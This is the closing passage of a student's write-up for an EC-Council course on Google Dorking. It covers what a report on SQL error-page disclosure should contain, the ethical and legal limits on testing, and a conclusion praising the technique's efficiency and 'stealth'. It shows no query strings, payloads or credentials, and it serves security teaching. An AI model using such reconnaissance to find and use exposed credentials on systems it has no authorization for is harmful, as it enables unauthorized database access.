1. **Clear Vulnerability Description**: Information disclosure via SQL error messages
2. **Step-by-Step Reproduction**: Exact Google Dork query used
3. **Visual Evidence**: Screenshots of error page and extracted credentials
4. **Technical Impact Analysis**: Database compromise potential
5. **Business Impact**: Data breach, compliance violations, reputation damage
6. **CVSS Scoring**: Quantified risk assessment (typically 7.5-9.8)
7. **Remediation Guidance**: Specific configuration changes needed

***

## ‚öñÔ∏è Ethical and Legal Considerations

**Authorization Requirements**:

- Google Dorking public information is generally legal
- Accessing discovered error pages requires explicit permission
- Testing extracted credentials is unauthorized access without written consent
- Document all activities for client reporting

**Responsible Disclosure**:

- Notify client immediately of credential exposure
- Recommend emergency credential rotation
- Provide temporary compensating controls if fixes require time
- Follow coordinated vulnerability disclosure timelines

**Data Handling**:

- Treat extracted credentials as highly sensitive
- Use encrypted communication for reporting
- Securely delete credentials after engagement
- Follow data retention policies in contract

***

## üèÅ Conclusion

This demonstration illustrates the severe risk of inadequate error handling in web applications. A simple, passive Google Dork query successfully identified a publicly indexed error page containing a complete database connection string with administrative credentials. This finding represents a critical vulnerability enabling immediate database compromise without requiring any active exploitation.

For penetration testers, systematic SQL error enumeration through Google Dorking provides:

- **Efficiency**: Rapid discovery of high-severity findings
- **Stealth**: Passive reconnaissance with no detection
- **Impact**: Demonstrable business risk with clear remediation path
- **Coverage**: Technology stack identification guides further testing

The four-database methodology (MySQL, MSSQL, PostgreSQL, Oracle) ensures comprehensive coverage of the most common enterprise database platforms. Combined with framework-specific error signatures, this approach maximizes the probability of discovering information disclosure vulnerabilities.

Every web application security assessment should incorporate these techniques as part of thorough reconnaissance operations.

***


---

## üìù About This Documentation

**Practical Testing Performed By**: Muhammad Izaz Haider

**Course**: EC-Council's Short Course - *Web Application Security Testing with Google Hacking*

**Purpose**: This documentation demonstrates the practical application of Google Dorking techniques learned during the course, transforming theoretical knowledge into hands-on security testing methodologies.

---

*This writeup is intended for educational purposes and authorized security testing only. Unauthorized testing of systems you don't own or have explicit permission to test is illegal.*
